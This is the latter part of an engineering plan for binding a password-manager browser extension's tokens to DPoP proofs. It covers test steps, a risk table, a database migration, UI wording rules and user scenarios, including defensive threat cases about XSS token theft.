2. SW restart (chrome://serviceworker-internals → terminate → trigger reconnect):
   - Re-issued cnfJkt thumbprint equals the previous one (read IDB row again).
3. Network tab on `/api/passwords` after connect:
   - `DPoP` request header present.
   - Value parses as JWS (3 base64url segments).
   - `Authorization: Bearer ...` ALSO present.
4. Upgrade-from-pre-PR (per Round 2 F4): on first SW activation after an upgrade with a stale pre-PR session-storage entry (no `tokenCnfJkt`), the badge shows disconnected state and the user is prompted to reconnect — no crash, no silent forced connect.

### Mock-reality alignment (RT1)

- Server-side mocks of `verifyDpopProof` return shapes matching the actual `DpopVerifyResult` union from `src/lib/auth/dpop/verify.ts:86-88`: `{ ok: true; claims: DpopProofClaims; jkt: string }` / `{ ok: false; error: DpopVerifyError; detail?: string }`. Tests use this exact shape.

### Pre-PR (R21 / R32 obligations)

- `scripts/pre-pr.sh` before push (feedback_run_pre_pr_before_push.md).
- `npx prisma migrate dev` against a clean dev DB to verify migration executes cleanly (feedback_run_migration_on_dev_db.md). The TRUNCATE in the migration is intentional — confirm dev DB rows count returns to 0 + column NOT NULL added.
- `npx next build` (catches SSR-only / Turbopack issues unit tests miss).
- Boot-test the extension in Chrome per T10 above.
- `npm run test:integration` lists the new file in discovery output (per T9).

---

## Considerations & constraints

### In scope

- All thirteen contracts above.
- Strict-from-day-one (per S3 decision): no legacy bearer-only branch.
- Playwright launchPersistentContext extension-loader setup (per T7 decision).
- AUDIT metadata for cnfBound + dpopError (per F5/T6 Option A).
- One PR after all phases complete (feedback_pr_cadence_aggregate.md).

### Out of scope (deferred)

- DPoP-Nonce challenges (RFC 9449 §8). iOS doesn't use them; extension mirrors. Could be added in a future plan if iat skew window is unacceptable.
- Extension key rotation policy beyond manual reset.
- `MobileBridgeCode` table — unchanged.
- IOS_APP behavioral changes — the helper extraction MUST be source-compatible for iOS callers.

### Known risks

| Risk | Likelihood | Mitigation |
|---|---|---|
| Page-context XSS substitutes JKT_READY before extension can respond | Medium | Strict mode + non-extractable key make exfil-and-replay infeasible; in-page XSS damage is unavoidable architectural limit |
| First-time DPoP key generation slower than 500 ms timeout on low-end devices | Low | 500 ms generous for P-256 keygen; if exceeded, user sees "extension required" — confusing UX, but recoverable on retry |
| Existing extension users hit "extension required" on every connect until they update | Expected | Pre-1.0 acceptable; release notes (NFR5) call out explicitly |
| IDB CryptoKey persistence broken in older Chrome | Low | MV3 requires Chrome 88+, which supports CryptoKey in IDB; smoke test on the minimum supported version |
| `validateExtensionToken` shared-helper refactor introduces regression in IOS_APP path | Medium | Existing IOS_APP test suite must pass without modification; review C5 invariants explicitly during code review |
| Manual "Reset connection" flow has new server endpoint — needs auth + rate limit | Low | C12 pins auth (Bearer + DPoP), rate-limit, body-cnfJkt-must-match-proof, and cross-user safety |
| Preflight cached for 24h via `Access-Control-Max-Age` (existing `cors.ts:70`) | Low | If a future PR adds another required header (e.g., DPoP-Nonce), it must either (a) deploy `Max-Age: 0` for one cycle to flush caches, or (b) accept up to 24h of stale-preflight 401s. No action this PR (per Round 2 S15) |
| TRUNCATE of `extension_bridge_codes` during deploy nukes up to 60s of in-flight handshakes | Low | Users see "code expired" once → retry succeeds. Acceptable for pre-1.0 deploy cadence (per Round 2 S22) |
| TRUNCATE replication semantics | Negligible | Repo does not use logical replication; streaming replicas handle TRUNCATE WAL natively. Documented in migration SQL header (per Round 2 S20) |
| SW killed mid-keygen leaves stranded server-side token | Low / self-healing | C6 persist-before-resolve ordering ensures the IDB write commits before the thumbprint is published; if SW dies between generateKey + put, next boot regenerates cleanly. Test covers this case (per Round 2 S17). Worst-case stranded tokens count against `EXTENSION_TOKEN_MAX_ACTIVE` (5 active) — recoverable via `/api/extension/key/reset` |
| Scope set unchanged from pre-this-PR (per Round 2 S18) | N/A | cnfJkt binding is orthogonal to scope authorization; no scope expansion or demotion |
| jti cache memory growth at scale | Acknowledged in NFR6 | Monitor Redis key count; size per NFR6 estimate (~60 × active-per-second keys) |

### Backward-compat invariants (defended by release notes, not code)

- Existing `ExtensionToken` rows with `cnfJkt = NULL` (iOS-only historically; BROWSER_EXTENSION historically never had cnfJkt populated). Post-this-PR, BROWSER_EXTENSION rows MUST have cnfJkt set. Existing BROWSER_EXTENSION rows from before this migration MUST be revoked at deploy time (one-time data migration step, part of the prisma migration, or a deploy-time script). **Action**: the migration also runs `DELETE FROM extension_tokens WHERE client_kind = 'BROWSER_EXTENSION' AND cnf_jkt IS NULL` to revoke legacy rows. Users get signed out of the extension; they must reconnect using the new flow.
- iOS-app tokens unchanged (the column was already populated for IOS_APP rows).

### Migration sequencing

The single Prisma migration performs:
```sql
-- 1. Truncate in-flight bridge codes (60s TTL).
TRUNCATE TABLE extension_bridge_codes;

-- 2. Delete legacy bearer-only ExtensionToken BROWSER_EXTENSION rows.
DELETE FROM extension_tokens
  WHERE client_kind = 'BROWSER_EXTENSION' AND cnf_jkt IS NULL;

-- 3. Add NOT NULL column to extension_bridge_codes.
ALTER TABLE extension_bridge_codes
  ADD COLUMN cnf_jkt VARCHAR(64) NOT NULL;
```
Order matters: step 2 must precede any future NOT NULL flip on `extension_tokens.cnf_jkt` (that flip is out of scope for THIS migration but the cleanup keeps the option open for a follow-up).

### Pre-1.0 string guidance

User-facing strings related to this change MUST use "requires latest version / 最新版が必要です" wording, NOT "廃止/deprecated/利用できません" (per feedback_pre_1_0_deprecation_wording.md). Examples:
- ❌ "古い拡張機能は廃止されました。"
- ❌ "Legacy extension is no longer supported."
- ✅ "この接続には最新版の passwd-sso 拡張機能が必要です。Chrome ウェブストアからインストール／更新後に再度お試しください。"
- ✅ "This connect requires the latest passwd-sso extension. Install or update from the Chrome Web Store and try again."

---

## User operation scenarios

1. **Fresh sign-in, new DPoP-aware extension installed**
   - Stage 1: `PASSWD_SSO_EXT_JKT_REQUEST` → content script → background → returns jkt → `PASSWD_SSO_EXT_JKT_READY` arrives within ~50 ms warm / ~200 ms cold.
   - Stage 2: web app POSTs `/api/extension/bridge-code` with `{cnfJkt: <jkt>}` → bridge-code row created with NOT NULL cnfJkt → 201.
   - Stage 3: web app posts `PASSWD_SSO_BRIDGE_CODE` → content script asks background for DPoP proof → fetches exchange with `DPoP: <proof>` → server verifies → issues token with cnfJkt → response carries cnfJkt.
   - Stage 4: background stores token + cnfJkt; subsequent `swFetch` / refresh / revoke all attach DPoP proofs via the shared helper.

2. **Fresh sign-in, NO extension installed (or extension does not handle JKT_REQUEST)**
   - Stage 1: web app posts JKT_REQUEST → no response within 500 ms → null.
   - Connect FAILS with `extensionRequired` message + "Open Chrome Web Store" action.

3. **Fresh sign-in, OLD extension installed (no DPoP support)**
   - Same as scenario 2: old content script doesn't handle JKT_REQUEST → timeout → "extension required" message.
   - User installs the new extension version → retry works.

4. **DPoP-aware extension after deploy, with a pre-deploy `ExtensionToken.cnfJkt = NULL` row**
   - The deploy-time migration deletes the legacy row.
   - On next browser startup the extension's hydrate sees no token → user retriggers connect → fresh DPoP-bound token issued via scenario 1.

5. **Attempted XSS exfiltration of a DPoP-bound bearer**
   - Attacker exfils the bearer.
   - Attacker calls `POST /api/passwords` with `Authorization: Bearer <stolen>`. No DPoP header.
   - validateExtensionToken (BROWSER_EXTENSION branch) requires DPoP → no header → `EXTENSION_TOKEN_DPOP_INVALID` → 401.

6. **Page-context XSS substitutes its own jkt at stage 1**
   - XSS responds to `PASSWD_SSO_EXT_JKT_REQUEST` before the content script.
   - Web app uses XSS's jkt → XSS performs the exchange itself (it controls the key) → bearer issued to XSS's key.
   - XSS can use it from within the page; CANNOT exfil for offline replay.

7. **Token refresh (~58 min after connect)**
   - Background SW alarm fires → `attemptTokenRefresh` calls `swFetchAuthenticated` → attaches DPoP → server validates the OLD token via DPoP (per FR4) → rotates to new row with same cnfJkt (per C10).
   - User remains signed in.

8. **Manual "Reset connection"**
   - User clicks Options → Reset connection.
   - Background SW POSTs `/api/extension/key/reset` with current Bearer + DPoP + the discarded thumbprint in the body. Server-side body-cnfJkt-must-match-proof check passes (caller proves possession of the key it is asking to revoke).
   - Server revokes all `ExtensionToken` rows with that cnfJkt for the user → returns `{revoked: N}`.
   - On 2xx response, background SW deletes IDB key. On non-2xx, key is retained + error surfaced.
   - On next connect, a fresh key + thumbprint is generated and the flow proceeds as scenario 1.

9. **Upgrade from pre-PR extension version with stale session-storage** (per Round 2 F4)
   - User had a pre-PR extension installed with a persisted session-storage entry (no `tokenCnfJkt` field).
   - User installs the new extension version.
   - On first SW activation, `loadSession()` finds `raw.tokenCnfJkt === undefined` → returns null → SW is in disconnected state.
   - Badge shows × (disconnected); user clicks the extension icon → sees "Connect to passwd-sso" prompt.
   - User triggers connect via `?ext_connect=1` → flows as scenario 1 → fresh DPoP-bound token issued.

---

End of plan (round 3 — all Round 1 + Round 2 findings incorporated).
